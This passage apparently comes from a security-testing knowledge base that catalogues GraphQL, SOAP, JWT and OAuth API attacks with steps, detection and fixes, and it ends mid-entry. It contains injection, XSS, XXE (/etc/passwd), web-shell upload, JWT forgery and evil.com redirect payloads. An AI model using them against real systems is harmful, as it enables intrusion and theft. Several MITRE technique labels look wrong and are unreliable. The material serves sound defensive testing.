- **Attack Type**: Resource Exhaustion via Complex Queries
- **Target**: GraphQL APIs
- **Vulnerability**: No query depth/complexity control
- **MITRE**: T1499 – Endpoint Denial of Service
- **Impact**: Outage, degraded performance, resource exhaustion
- **Tools**: GraphiQL, Postman, curl
- **Scenario**: Attackers craft highly complex nested GraphQL queries (deep recursion or large fan-out) that overwhelm server processing power, causing performance degradation or complete denial of service.
- **Attack Steps**: Step 1: Open the GraphQL endpoint in GraphiQL or Postman. Step 2: Construct a simple query with recursive nesting like: query { user { friends { friends { friends { friends { name } } } } } }. Step 3: If the server returns data or takes a long time to respond, this indicates lack of complexity control. Step 4: Now create a large query that asks for many fields in one go (e.g., query all types, nested fields, and subfields). Step 5: Try sending 5–10 similar queries rapidly to simulate a DoS condition. Step 6: Monitor server response — if it slows down or crashes, the endpoint is vulnerable. Step 7: Use automated tools to generate large GraphQL queries that exceed reasonable processing limits. Step 8: Document server behavior under load. Step 9: Recommend implementing query depth and complexity limits (e.g., max 5 depth, 100 complexity score). Step 10: After patching, repeat steps to confirm the server rejects or blocks abusive queries.
- **Detection**: Monitor query execution time and server CPU spikes; log excessive depth
- **Solution**: Set depth/complexity limits using middleware; throttle user queries
- **Tags**: GraphQL DoS, Query Flood, Nested Query Attack

## GraphQL Schema Exposure Through Error Messages

- **Attack Type**: Information Disclosure via Verbose Errors
- **Target**: GraphQL APIs
- **Vulnerability**: Verbose error messages exposing schema
- **MITRE**: T1592 – Gather Victim Host Information
- **Impact**: Backend structure discovery, targeted attack preparation
- **Tools**: GraphiQL, Postman, curl
- **Scenario**: Detailed GraphQL error messages reveal backend types, field names, logic, and stack traces, helping attackers map internal structure and perform targeted attacks.
- **Attack Steps**: Step 1: Send malformed or unauthorized GraphQL queries (e.g., access adminData, or request a field that doesn't exist like query { user { secretToken } }). Step 2: Observe the error messages returned by the server. Step 3: If the error shows the path of execution, internal model names, or stack traces (e.g., “Cannot query field ‘secretToken’ on type ‘User’”), this reveals schema internals. Step 4: Try to guess internal fields or roles (e.g., isAdmin, status, permissions) based on the error feedback. Step 5: Use this to gradually discover hidden or undocumented fields and types. Step 6: Repeat using invalid inputs in mutations (e.g., { updateUser(input: {role: "admin"}) }) and analyze responses. Step 7: Recommend customizing error responses to generic messages (e.g., “Invalid query”) in production. Step 8: Retest after patch to ensure detailed field/type errors are not returned.
- **Detection**: Log errors for internal debugging only; audit GraphQL error paths
- **Solution**: Suppress schema error details in production; provide generic messages
- **Tags**: GraphQL Error Leak, Schema Discovery, Recon

## Using Deprecated Fields to Access Sensitive Data

- **Attack Type**: Legacy Field Exploitation
- **Target**: GraphQL APIs
- **Vulnerability**: Active deprecated fields still processing requests
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Unauthorized access via legacy logic
- **Tools**: GraphiQL, Burp Suite, curl
- **Scenario**: Attackers abuse deprecated but still-active fields in GraphQL schema to access sensitive or restricted data that’s no longer shown in the frontend.
- **Attack Steps**: Step 1: Run an introspection query to identify all types and fields in the schema. Step 2: Look for fields marked as "isDeprecated": true (e.g., oldPassword, legacyAdminField, rawUserToken). Step 3: Submit a query that accesses these deprecated fields (e.g., query { user { id name legacyAdminField } }). Step 4: If data is returned from these fields, even though they are not visible in the frontend, it confirms exploitation is possible. Step 5: Try inserting these fields into mutations too (e.g., updateUser(input: { legacyRole: "admin" })). Step 6: Document any sensitive data or elevated access achieved via deprecated fields. Step 7: Recommend fully removing deprecated fields or gating them behind strict role-based access control. Step 8: Retest to confirm access is now restricted or deprecated fields are completely removed. Step 9: Use schema linter tools to identify lingering deprecated logic in production. Step 10: Monitor for API access to deprecated endpoints in logs.
- **Detection**: Audit logs for use of deprecated fields; introspect schema regularly
- **Solution**: Remove deprecated fields fully; enforce access control based on user roles
- **Tags**: GraphQL Deprecation, Legacy Access, Schema Bloat

## Lack of Depth Limiting Leading to Complex Nested Queries Abuse

- **Attack Type**: Resource Exhaustion via Deep Field Nesting
- **Target**: GraphQL APIs
- **Vulnerability**: No depth restriction on GraphQL queries
- **MITRE**: T1499 – Endpoint Denial of Service
- **Impact**: Application slowdown, backend crashes
- **Tools**: GraphiQL, Postman, graphql-query-complexity
- **Scenario**: Without query depth limits, attackers can chain recursive fields infinitely, causing expensive server-side operations that lead to slowdowns or crashes.
- **Attack Steps**: Step 1: In GraphiQL or Postman, identify recursive fields (e.g., user.friends.friends). Step 2: Construct a deeply nested query such as: query { user { friends { friends { friends { friends { friends { name } } } } } } }. Step 3: Send the query and observe how long it takes to respond. Step 4: Increase depth even more to see if server memory or CPU spikes. Step 5: Combine this with multiple subfields to increase payload size. Step 6: Send many such queries simultaneously to simulate real DoS. Step 7: Recommend using middleware (like graphql-depth-limit) to enforce a maximum query depth. Step 8: After patching, retry sending nested queries — expect the server to return an error like “Query is too deep.” Step 9: Document final depth threshold and log thresholds per role (e.g., devs can have more depth than regular users). Step 10: Monitor logs for recurring deep query patterns.
- **Detection**: Track nested query lengths in logs; detect recursion pattern
- **Solution**: Apply graphql-depth-limit; enforce max depth per user role
- **Tags**: GraphQL Depth Limit, DoS, Nested Query Abuse

## Unprotected Introspection Queries Allow Reconnaissance

- **Attack Type**: Schema Enumeration via Open Introspection
- **Target**: GraphQL APIs
- **Vulnerability**: Open introspection in production environment
- **MITRE**: T1592 – Gather Victim Host Information
- **Impact**: Full backend API discovery, privilege escalation setup
- **Tools**: GraphiQL, curl, Postman
- **Scenario**: GraphQL introspection queries are left open in production, allowing attackers to enumerate backend types, fields, arguments, and mutation logic to craft attacks.
- **Attack Steps**: Step 1: Use a GraphQL introspection query like {"query":"{__schema { types { name fields { name } } } }"}. Step 2: If the server responds with a complete list of types and fields, this confirms introspection is open. Step 3: Extract all query and mutation names (e.g., getUserById, resetPassword, deleteAccount, adminStats). Step 4: Use this to build a map of the backend API structure. Step 5: Try manually submitting queries against these endpoints to test for weak auth or sensitive data access. Step 6: Enumerate arguments required for each field (e.g., input, id, role) from the schema. Step 7: Attempt to craft queries using only this schema knowledge, without prior frontend exposure. Step 8: Recommend disabling introspection in production or requiring auth for it. Step 9: After patching, resend the introspection query — expect no schema or a 403 response. Step 10: Log and alert on introspection attempts in production.
- **Detection**: Log all schema and type requests; detect introspection queries
- **Solution**: Disable introspection in production; restrict by role or IP
- **Tags**: GraphQL Recon, Introspection Abuse, Schema Leak

## Exploiting GraphQL Subscriptions to Bypass Access Controls

- **Attack Type**: Real-Time Data Leaks via Subscription Events
- **Target**: GraphQL APIs (WebSocket)
- **Vulnerability**: Missing or weak auth in GraphQL subscriptions
- **MITRE**: T1020 – Automated Exfiltration
- **Impact**: Real-time data leaks, unauthorized surveillance
- **Tools**: GraphiQL, WebSocket clients, Subscriptions tab
- **Scenario**: Attackers abuse open GraphQL subscription endpoints (used for live data) to receive sensitive updates (e.g., new users, chat messages) even if they’re not authorized for that data.
- **Attack Steps**: Step 1: Connect to the GraphQL endpoint using a WebSocket tool (GraphiQL subscriptions tab, Altair, or browser devtools). Step 2: Send a subscription query like subscription { userAdded { id name email } }. Step 3: Wait to see if new data (e.g., users being added) streams to the client without proper authentication or role validation. Step 4: If unauthorized user receives real-time updates, it confirms access control flaw in the subscription resolver. Step 5: Repeat with other subscriptions like messageReceived, orderUpdated, or chatStream. Step 6: Try sending multiple simultaneous connections to observe data leakage scope. Step 7: Document the sensitive data exposed through subscriptions. Step 8: Recommend enforcing access checks at the resolver level for subscriptions. Step 9: After patching, repeat steps and expect no data unless properly authorized. Step 10: Monitor subscription traffic for abuse.
- **Detection**: Monitor WebSocket connections and stream payloads for role mismatch
- **Solution**: Implement role-based checks in subscription resolvers; secure WebSocket handshake
- **Tags**: GraphQL Subscriptions, WebSocket Security

## Abuse of GraphQL Variables to Inject Malicious Payloads

- **Attack Type**: Injection via Variable Placeholders
- **Target**: GraphQL APIs
- **Vulnerability**: No input sanitization in variable-based input
- **MITRE**: T1059 – Command Execution
- **Impact**: Script injection, logic tampering, stored XSS
- **Tools**: Postman, Burp Suite, GraphiQL
- **Scenario**: GraphQL variables are often inserted directly into backend logic without sanitization, enabling injection of script code, database queries, or special characters for bypasses.
- **Attack Steps**: Step 1: Identify GraphQL operations that use $variables (e.g., query or mutation with variable input like $input). Step 2: Submit a standard request and then tamper with variables to inject payloads (e.g., XSS: <script>alert(1)</script>, SQLi: "' OR 1=1 --). Step 3: Modify the request body like: {"query":"mutation updateUser($input: UserInput!) { updateUser(input: $input) { id } }", "variables": {"input": {"email":"<img src=x onerror=alert(1)>", "role":"user"}}. Step 4: If the backend reflects or processes this data without escaping/sanitizing, it’s vulnerable. Step 5: Test various encodings (e.g., base64, URL encoding) to evade filters. Step 6: Try injection inside nested objects or stringified JSON inside a variable. Step 7: Document any payloads that were executed or accepted. Step 8: Recommend escaping input and validating variable values at the schema and resolver level. Step 9: Retest after patch to ensure unsafe variables are blocked. Step 10: Monitor GraphQL logs for injection patterns in variables.
- **Detection**: Log and inspect variable payloads; scan for script patterns
- **Solution**: Sanitize input; enforce strict type validation for all GraphQL variables
- **Tags**: GraphQL Variables, XSS, SQLi, Input Injection

## GraphQL Mutation Authorization Bypass

- **Attack Type**: Privilege Escalation via Mutation Exploit
- **Target**: GraphQL APIs
- **Vulnerability**: Lack of resolver-level access control for mutations
- **MITRE**: T1068 – Exploitation for Privilege Escalation
- **Impact**: Privilege escalation, sensitive object tampering
- **Tools**: GraphiQL, Postman, Burp Suite
- **Scenario**: Attackers use direct GraphQL mutation access (e.g., updateUser, deletePost) to modify sensitive objects without being checked for proper authorization or ownership.
- **Attack Steps**: Step 1: Identify available mutations via introspection (e.g., updateUser, deleteOrder, grantAdminRole). Step 2: Try calling a mutation that should only be available to admins (e.g., mutation { updateUser(id: "123", role: "admin") { id name role } }) using a normal user token or unauthenticated session. Step 3: If the server accepts the request and updates protected data (e.g., promotes user to admin), it confirms missing authorization logic. Step 4: Repeat this for multiple mutations to test their access control (e.g., updating other users' profiles, accessing others' orders). Step 5: Chain multiple mutations for lateral movement (e.g., elevate → update → delete). Step 6: Document mutation endpoints with missing or weak auth. Step 7: Recommend strict role-based auth in each resolver, not just frontend. Step 8: Retest with low-privileged tokens to ensure mutations are now rejected. Step 9: Monitor GraphQL mutation logs for abnormal user actions.
- **Detection**: Log mutation activities per user role; alert on unusual mutation use
- **Solution**: Add per-resolver auth checks; validate object ownership on update/delete
- **Tags**: GraphQL Mutation Abuse, Auth Bypass, Priv Escalation

## Exploiting Unsecured File Uploads in GraphQL Endpoints

- **Attack Type**: File Upload Abuse for RCE or Info Leak
- **Target**: GraphQL APIs
- **Vulnerability**: Missing file validation/sanitization for uploads
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Remote Code Execution, credential leakage
- **Tools**: Postman, curl, GraphiQL
- **Scenario**: Some GraphQL APIs support file upload via mutations (e.g., uploadFile) without proper validation, letting attackers upload malicious files (e.g., .php, .jsp) to execute or leak data.
- **Attack Steps**: Step 1: Identify mutations like uploadFile, addDocument, or submitAttachment that accept file uploads (usually as multipart/form-data GraphQL requests). Step 2: Try uploading a standard file first (e.g., .txt) to confirm functionality. Step 3: Now upload a web shell (e.g., .php or .jsp) or file with embedded malicious code. Step 4: If the file is accepted and uploaded to a web-accessible directory, try accessing it directly (e.g., https://target.com/uploads/shell.php). Step 5: If the file executes (e.g., you see phpinfo()), the endpoint is vulnerable to RCE. Step 6: Even without execution, test whether sensitive files (e.g., .env, .xml, or .zip with tokens) can be uploaded and downloaded. Step 7: Document the directory path and file types accepted. Step 8: Recommend validating file types/extensions, checking MIME type, and storing files outside web root. Step 9: Retest with blocked extensions. Step 10: Monitor upload directory and logs.
- **Detection**: Monitor file extensions, upload paths, and MIME type
- **Solution**: Use file-type whitelisting; store files outside web root; scan uploads for malware
- **Tags**: GraphQL File Upload, RCE, LFI, Web Shell Upload

## Using GraphQL to Enumerate Users or Sensitive Entities

- **Attack Type**: User/Entity Enumeration via Iterative Queries
- **Target**: GraphQL APIs
- **Vulnerability**: Predictable responses for valid vs invalid entities
- **MITRE**: T1589 – Gather Victim Identity Information
- **Impact**: Enumeration of users, IDs, emails, projects
- **Tools**: GraphiQL, Burp Suite, Postman
- **Scenario**: Attackers exploit user-identifiable fields (e.g., email, ID, username) in GraphQL queries to confirm existence or gather sensitive info about system entities.
- **Attack Steps**: Step 1: Identify fields that respond differently when valid vs invalid (e.g., userByEmail(email: "test@x.com")). Step 2: Begin enumerating known emails, usernames, or IDs using a list (e.g., from a data breach). Step 3: Submit one query at a time and observe responses. For valid users, the query may return user details; for invalid ones, an error like “not found” appears. Step 4: Automate this enumeration using Burp Intruder or custom Python scripts. Step 5: If the API is leaking user info, confirm impact by testing rate limits and logging behavior. Step 6: Repeat enumeration for other entities (e.g., orderById, getTeamByName, projectByCode). Step 7: Recommend returning generic errors (e.g., “Invalid credentials”) regardless of input. Step 8: Add rate limiting and CAPTCHA if exposed to public. Step 9: Recheck responses after patch to confirm enumeration fails. Step 10: Monitor for repeated failed lookup attempts from same IP.
- **Detection**: Log API queries by field; alert on brute-force patterns
- **Solution**: Return generic messages for all lookups; limit repeated queries
- **Tags**: GraphQL Enumeration, Info Leak, Username Hunting

## Blind GraphQL Injection Using Time-Based Techniques

- **Attack Type**: Blind Injection via Time Delay
- **Target**: GraphQL APIs
- **Vulnerability**: Unsanitized inputs leading to blind injection
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Stealthy data access, backend logic probing
- **Tools**: Postman, Burp Suite, graphqlmap
- **Scenario**: Attackers inject payloads into GraphQL fields that cause time delays (e.g., sleep), helping identify injection points even when responses don't display output.
- **Attack Steps**: Step 1: Send a standard GraphQL query like query { user(id: "1") { name } } and observe response time. Step 2: Now inject a time delay payload in a vulnerable field (e.g., "1 OR pg_sleep(5)--" or "; sleep(5);" in MySQL/Unix). Example: query { user(id: "1 OR pg_sleep(5)--") { name } }. Step 3: If the response time is significantly delayed, this confirms injection vulnerability. Step 4: Repeat the process on various parameters and mutations. Step 5: Use automated tools like graphqlmap to fuzz input fields with timing-based payloads. Step 6: Combine multiple delays (e.g., sleep(10), sleep(15)) to confirm consistent timing correlation. Step 7: Document which input fields accept and execute the injection payload. Step 8: Recommend using parameterized queries and input validation to mitigate injection. Step 9: Retest with same payloads after patch — expect no delay. Step 10: Log GraphQL field latency and flag anomalies.
- **Detection**: Monitor abnormal delays per field/query; analyze server logs for long exec time
- **Solution**: Sanitize and validate all inputs; use query builders with param binding
- **Tags**: GraphQL Injection, Timing Attack, Blind Exploit

## Bypassing Rate Limiting with GraphQL Queries

- **Attack Type**: Rate Limit Evasion via Payload Obfuscation
- **Target**: GraphQL APIs
- **Vulnerability**: Poor query normalization before applying rate limit
- **MITRE**: T1499 – Endpoint Denial of Service
- **Impact**: Resource exhaustion, abuse of API infrastructure
- **Tools**: Postman, Burp Suite Intruder, custom script
- **Scenario**: Attackers evade per-endpoint or IP-based rate limits by crafting GraphQL queries that look unique each time (e.g., using aliases or slight field variation).
- **Attack Steps**: Step 1: Send the same query repeatedly (e.g., query { user(id: "1") { name } }) and monitor when the rate limit triggers (e.g., after 100 requests → 429 Too Many Requests). Step 2: Bypass this limit by modifying the query slightly (e.g., using aliases like query { u1: user(id: "1") { name } }, query { u2: user(id: "1") { name } }). Step 3: Observe that each aliased version is treated as a different query by naive rate limiting logic. Step 4: Automate this using Burp Intruder with payloads changing aliases (u1, u2, u3, ...). Step 5: Send a high volume of obfuscated queries and confirm if rate-limiting fails. Step 6: Test other bypass techniques: changing query casing, adding dummy fields, or adding variables. Step 7: Document successful bypass techniques. Step 8: Recommend rate-limiting by user/IP rather than query string. Step 9: Apply query normalization before counting rate. Step 10: Monitor alias-heavy or randomized queries as anomalies.
- **Detection**: Track aliases in query; detect repeated semantic queries despite changes
- **Solution**: Normalize query structure before applying rate limit; apply user-based throttling
- **Tags**: GraphQL Rate Limit Bypass, Aliases Abuse

## Exploiting GraphQL Relay Connections for Data Leakage

- **Attack Type**: Pagination Abuse to Access Restricted Data
- **Target**: GraphQL Relay APIs
- **Vulnerability**: Weak or unsigned cursor implementation
- **MITRE**: T1530 – Data from Information Repositories
- **Impact**: Information disclosure through pagination abuse
- **Tools**: GraphiQL, Postman, Relay Explorer
- **Scenario**: GraphQL Relay connections use cursors for pagination. If not securely implemented, attackers can tamper with cursors to enumerate or access unintended data beyond their permission level.
- **Attack Steps**: Step 1: Identify a GraphQL query using Relay connections like query { users(first: 2) { edges { node { id name } cursor } } }. Step 2: Capture the cursor value from the response (e.g., "YXJyYXljb25uZWN0aW9uOjE="). Step 3: Decode this cursor (usually base64) to get the offset/index. Step 4: Increment the index manually (e.g., change OjE= to OjI=) and re-encode in base64. Step 5: Modify your query to use after parameter: users(first: 2, after: "YXJyYXljb25uZWN0aW9uOjI="). Step 6: Repeat this process to paginate beyond the limit, possibly accessing data of other users. Step 7: Test combinations like before, last, or even negative indexes to bypass limits. Step 8: If data leaks from other user contexts, access controls are broken. Step 9: Recommend encrypting or signing cursors and checking user permissions per page. Step 10: Retest — unauthorized data must not appear with tampered cursors.
- **Detection**: Detect cursor tampering; log abnormal pagination patterns
- **Solution**: Use signed/encrypted cursors; validate ownership with every page access
- **Tags**: GraphQL Relay Exploit, Pagination Bypass

## Misconfigured Error Handling in GraphQL APIs Exposes Sensitive Info

- **Attack Type**: Verbose Stack Trace or Internal Logic Disclosure
- **Target**: GraphQL APIs
- **Vulnerability**: Leaky error handling revealing sensitive internals
- **MITRE**: T1592 – Gather Victim Host Information
- **Impact**: Exposure of backend code, file paths, business logic
- **Tools**: GraphiQL, curl, Postman
- **Scenario**: Developers leave verbose error messages or uncaught exceptions in GraphQL APIs, exposing file paths, internal logic, server stack traces, or business rules in production.
- **Attack Steps**: Step 1: Send intentionally broken queries (e.g., query { unknownField } or query { user(id: "nonexistent") { name } }). Step 2: Observe if the response includes messages like: “Unhandled Exception: Cannot read property 'email' of undefined at UserResolver.js:45:12”. Step 3: Repeat with broken mutations and deeply nested queries to trigger edge-case failures. Step 4: If stack traces, source code filenames, or raw SQL queries are exposed, it's a serious misconfiguration. Step 5: Attempt type mismatch injection (e.g., send string where number expected) to produce internal coercion errors. Step 6: Use GraphQL error tools to monitor consistency of error formats. Step 7: Recommend customizing error responses in production to only show user-friendly messages (e.g., “Something went wrong”). Step 8: Disable stack trace exposure unless in dev mode. Step 9: Retest with broken queries — now the error must be generic. Step 10: Log raw errors securely for devs only.
- **Detection**: Scan logs for detailed error messages; simulate query failures in test cases
- **Solution**: Suppress verbose errors in production; use global error handler middleware
- **Tags**: GraphQL Misconfig, Stack Trace, Debug Info Exposure

## GraphQL Endpoint Discovery via Public Documentation

- **Attack Type**: Recon via Public Docs, JS Files, and Dev Tools
- **Target**: Web Apps with GraphQL
- **Vulnerability**: Publicly exposed GraphQL endpoints
- **MITRE**: T1592 – Gather Victim Host Information
- **Impact**: Precursor to enumeration, injection, or abuse
- **Tools**: Browser Devtools, Burp Suite, JSParser
- **Scenario**: Attackers discover hidden or undocumented GraphQL endpoints by scraping docs, JS files, developer portals, or browser devtools in frontend apps.
- **Attack Steps**: Step 1: Visit the target application and open browser DevTools (F12 → Network tab). Step 2: Refresh the page and search for GraphQL traffic — look for POST requests to /graphql, /api/graphql, /gql, etc. Step 3: Inspect request/response headers and body to confirm it’s a GraphQL endpoint. Step 4: View source files (Ctrl+U) and check linked JavaScript files. Step 5: Download JS files and search them for terms like GraphQLClient, gql, endpoint, mutation, or query. Step 6: Identify the exact URL path of the GraphQL endpoint. Step 7: Try accessing that endpoint directly in Postman or curl to verify access. Step 8: Also search public documentation, Swagger/OpenAPI docs, or developer wikis. Step 9: If endpoint is found and not secured (e.g., no auth, no CORS), it can be further exploited. Step 10: Recommend obfuscating frontend logic, securing endpoints with auth, and avoiding exposing internal APIs.
- **Detection**: Scan frontend JS; monitor unusual endpoint probes via logs
- **Solution**: Require auth for all GraphQL endpoints; restrict CORS origins
- **Tags**: GraphQL Discovery, Endpoint Recon, JS Parsing

## SOAP API XML Injection Attacks

- **Attack Type**: XML Payload Injection via SOAP
- **Target**: SOAP APIs
- **Vulnerability**: Poor XML parsing and input validation
- **MITRE**: T1220 – XSL Script Processing
- **Impact**: Information disclosure, logic bypass, DoS
- **Tools**: SoapUI, Postman, Burp Suite (with XML plugin)
- **Scenario**: SOAP APIs use XML as input. If input is not properly sanitized, attackers can inject malicious XML to manipulate logic or cause DoS. Sometimes leads to XXE or schema bypass.
- **Attack Steps**: Step 1: Identify a SOAP endpoint (usually WSDL link like /service?wsdl). Step 2: Use SoapUI or Postman to send a request with XML body. Step 3: Replace normal field with malicious XML (e.g., <username>admin' or '1'='1</username> or malformed tags). Step 4: Observe if the server behaves strangely (e.g., gives access, crashes, or exposes stack trace). Step 5: Try adding XML comments (<!-- -->), broken tags, or XSL payloads. Step 6: Attempt entity injection: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <username>&xxe;</username>. Step 7: If response leaks file content, confirms XXE. Step 8: Document which field accepted injection and its effect. Step 9: Recommend disabling external entity loading and validating XML structure using strict XSDs. Step 10: Retest after patch; malformed XML should now be rejected.
- **Detection**: Monitor for malformed XML; log rejected requests with parsing errors
- **Solution**: Use strict XML schema validation; disable DTD/XXE support in XML parsers
- **Tags**: SOAP Injection, XML Exploits, XXE

## REST to SOAP API Protocol Confusion Exploits

- **Attack Type**: Protocol Confusion and Route Injection
- **Target**: Hybrid APIs (REST + SOAP)
- **Vulnerability**: Confusion in request body format parsing
- **MITRE**: T1611 – Input Interpretation Abuse
- **Impact**: WAF bypass, unexpected behavior, logic flaws
- **Tools**: Postman, SoapUI, Burp Suite
- **Scenario**: In hybrid systems, REST and SOAP coexist. An attacker sends SOAP-like payloads to REST endpoints (or vice versa), exploiting parsing confusion to bypass logic or WAF rules.
- **Attack Steps**: Step 1: Identify APIs that support both REST and SOAP endpoints (e.g., /rest/ and /soap/). Step 2: Try sending SOAP envelope payloads (XML) to REST endpoints that usually accept JSON. Step 3: For example, send a POST request to /api/rest/user with a SOAP XML body. Step 4: If the API accepts and processes it, it indicates protocol confusion. Step 5: Use this to bypass firewalls or WAFs that expect only JSON or REST formats. Step 6: Try injecting data into parameters embedded within XML or REST query strings. Step 7: Observe differences in how inputs are interpreted. Step 8: Document endpoints accepting mismatched protocol formats. Step 9: Recommend strict content-type enforcement and request body validation. Step 10: Retest with mixed formats — they should now be rejected with proper HTTP 400.
- **Detection**: Monitor for content-type mismatches; flag unsupported MIME usage
- **Solution**: Validate Content-Type; enforce format per endpoint
- **Tags**: REST-SOAP Confusion, Format Smuggling

## API Endpoint Access Using JWT Token Forgery

- **Attack Type**: JWT Signature Bypass via None or HMAC Key Confusion
- **Target**: JWT-based API
- **Vulnerability**: Missing or misconfigured JWT signature verification
- **MITRE**: T1552 – Credential Manipulation
- **Impact**: Privilege escalation, account takeover
- **Tools**: JWT.io, Burp Suite, jwt_tool
- **Scenario**: Forging or modifying JWT tokens to escalate privileges or bypass authentication by exploiting weak signature validation logic (e.g., none alg, public key misuse).
- **Attack Steps**: Step 1: Capture a valid JWT from browser or API request using browser DevTools or Burp. Step 2: Decode the JWT using jwt.io and analyze the payload (e.g., role: user). Step 3: Modify the payload to escalate privileges (e.g., "role":"admin"). Step 4: Change the alg from "HS256" to "none" and remove the signature field entirely. Step 5: Send the modified JWT to the API in the Authorization header. Step 6: If access is granted, it means the server improperly accepts unsigned tokens. Step 7: Alternatively, attempt signing your modified token using a guessed or public key. Step 8: Use jwt_tool or jwtsploit to automate common JWT forgery tests. Step 9: Document which endpoints accepted the forged tokens. Step 10: Recommend verifying JWT signature with proper algorithm and rejecting none or invalid signatures.
- **Detection**: Monitor failed signature verifications; alert on alg:none tokens
- **Solution**: Enforce strong algs (e.g., RS256); never accept tokens with missing/invalid signatures
- **Tags**: JWT None Exploit, Signature Bypass, Token Forgery

## Exploiting OAuth Token Endpoint Vulnerabilities

- **Attack Type**: Token Theft or Misuse at Token Endpoint
- **Target**: OAuth APIs
- **Vulnerability**: Open redirect or missing validation in token flow
- **MITRE**: T1528 – Abuse Authentication Mechanism
- **Impact**: Token theft, impersonation, unauthorized access
- **Tools**: OAuth Debugger, Burp Suite, mitmproxy
- **Scenario**: Attackers exploit insecure token endpoints (e.g., lack of validation, open redirect, CSRF) to obtain or reuse access tokens. Often seen in OAuth2 Authorization Code flows.
- **Attack Steps**: Step 1: Visit the OAuth authorization flow (e.g., /auth?client_id=...&redirect_uri=...). Step 2: Modify redirect_uri to point to a domain controlled by you (e.g., evil.com/callback). Step 3: If the server issues a code to that URI without validation, you’ve achieved an open redirect. Step 4: Use that code to request access token from the /token endpoint. Step 5: Alternatively, test if the /token endpoint accepts repeated token exchanges using the same code. Step 6: Use Burp to intercept the full flow and try replaying authorization codes. Step 7: Document endpoints where token response is insecure or reusable. Step 8: Recommend validating redirect_uri and setting short expiration for codes. Step 9: Enable PKCE (Proof Key for Code Exchange) for all public clients. Step 10: Retest flow — tokens should only issue to valid clients once.
- **Detection**: Log all redirect_uri mismatches; alert on token reuse attempts
- **Solution**: Enforce redirect URI allowlists; implement PKCE and auth code expiration
- **Tags**: OAuth Exploits, Redirect URI, Token Replay

## API Replay Attacks Using Captured Tokens

- **Attack Type**: Reuse of Captured Authorization Tokens
- **Target**: APIs using Bearer Tokens
- **Vulnerability**: Long-lived or re-usable tokens
- **MITRE**: T1078 – Valid Accounts
- **Impact**: Persistent access by unauthorized user
- **Tools**: Burp Suite, Wireshark, Postman, mitmproxy
- **Scenario**: Attackers capture valid tokens (e.g., via man-in-the-middle, proxy, local storage theft) and reuse them to replay previous API calls, bypassing session expiration or performing unauthorized actions.
- **Attack Steps**: Step 1: Observe API communication using a proxy like Burp or mitmproxy. Step 2: Capture a request that includes an access token in the Authorization: Bearer <token> header. Step 3: Copy this request and resend it multiple times. Step 4: If all requests succeed (even hours later), token reuse is possible. Step 5: Test token reuse on sensitive endpoints like /user/delete, /admin/config, etc. Step 6: Try replaying same token from different IP or device. Step 7: If session or token is accepted without revalidation, the system lacks anti-replay protection. Step 8: Recommend binding tokens to device/IP and enforcing token rotation. Step 9: Suggest using exp (expiration), jti (unique ID), or nonce claims in tokens. Step 10: Retest with stolen tokens after patch — they should be rejected after first use or timeout.
- **Detection**: Monitor repeated token use across time/devices; flag stale token reuse
- **Solution**: Use short-lived tokens; track and revoke old/stolen tokens; bind token to client fingerprint
- **Tags**: Replay Attack, Token Abuse, Access Token Exploit

## Manipulating API Request Headers to Bypass Controls

- **Attack Type**: Header Injection to Alter Authentication or Behavior
- **Target**: REST APIs, Proxied APIs
- **Vulnerability**: Trusting unverified headers from client
- **MITRE**: T1071 – Application Layer Protocol
- **Impact**: Identity spoofing, rate limit bypass, authorization abuse
- **Tools**: Postman, Burp Suite, curl
- **Scenario**: APIs often rely on headers like X-User, X-Forwarded-For, or Authorization. If these are not validated correctly, attackers can spoof identities, origin, or bypass rate limiting.
- **Attack Steps**: Step 1: Identify an API endpoint that requires user authentication or applies rate limiting (e.g., /api/profile, /api/update). Step 2: Using Burp or Postman, intercept a valid request and look for headers like Authorization, X-User, X-Forwarded-For, or X-Role. Step 3: Modify X-User to another username (e.g., X-User: admin) and resend the request. Step 4: If the server accepts the spoofed identity, you have successfully bypassed identity verification. Step 5: Try rate limit evasion by rotating X-Forwarded-For with random IPs. Step 6: Some APIs trust reverse proxies and forward IP addresses using these headers, which can be spoofed. Step 7: Try injecting headers like X-Original-URL to override request routing. Step 8: Log all successful bypass cases and document which headers are improperly trusted. Step 9: Recommend server-side validation of all headers and never trust client-supplied header fields. Step 10: Retest — spoofed headers should now be ignored or rejected.
- **Detection**: Monitor headers like X-Forwarded-For for anomalies; validate header values and origin strictly
- **Solution**: Only trust headers set by secure internal proxies; sanitize and validate all headers
- **Tags**: Header Spoofing, X-Forwarded-For, API Abuse

## Abuse of API Caching Leading to Data Staleness or Exposure

- **Attack Type**: Cache Poisoning and Leakage
- **Target**: API + CDN or Proxy Layer
- **Vulnerability**: Lack of user-specific cache isolation
- **MITRE**: T1600 – Weaken Encryption/Cache Key Abuse
- **Impact**: Stale or unauthorized data leakage
- **Tools**: curl, Burp Suite, Cache Poisoning Tool
- **Scenario**: Attackers exploit improperly configured API caching layers (e.g., CDN, reverse proxy) to serve stale, unauthorized, or poisoned data to other users.
- **Attack Steps**: Step 1: Send a request to a public API endpoint (e.g., /api/news/latest) and observe caching headers like Cache-Control, ETag, Vary, X-Cache. Step 2: Modify query parameters or headers to poison cache — e.g., request ?user=admin and check if that response is cached. Step 3: If API does not vary cache based on authenticated user, the next user may see cached admin response. Step 4: Test by logging in as another user and requesting the same URL. Step 5: If you receive cached data from previous user, this is a data leakage. Step 6: Also test if stale data is returned even after record is updated, indicating cache invalidation failure. Step 7: Try manipulating headers like Host, X-Forwarded-Host, or Accept-Encoding to create inconsistent cache keys. Step 8: Log all cases where cache key design is vulnerable. Step 9: Recommend proper use of Vary, user-specific cache keys, and short TTL for sensitive data. Step 10: Retest — different users must receive isolated, fresh responses.
- **Detection**: Monitor X-Cache headers; compare cache key behavior across sessions
- **Solution**: Apply user-aware cache keys (Vary by token/session); disable cache for sensitive API endpoints
- **Tags**: API Cache Poisoning, CDN Abuse, Stale Data Leakage

## Using API Debug or Admin Endpoints to Execute Commands

- **Attack Type**: Abuse of Exposed Internal/Debug Routes
- **Target**: Admin or Dev APIs
- **Vulnerability**: No auth or exposed debug/dev consoles
- **MITRE**: T1210 – Exploitation of Remote Services
- **Impact**: Full system compromise, data theft, RCE
- **Tools**: Postman, Burp, browser DevTools
- **Scenario**: Developers leave debug or admin routes (/debug, /admin, /internal, /console) exposed. If unauthenticated or weakly protected, these may allow code execution or data dumps.
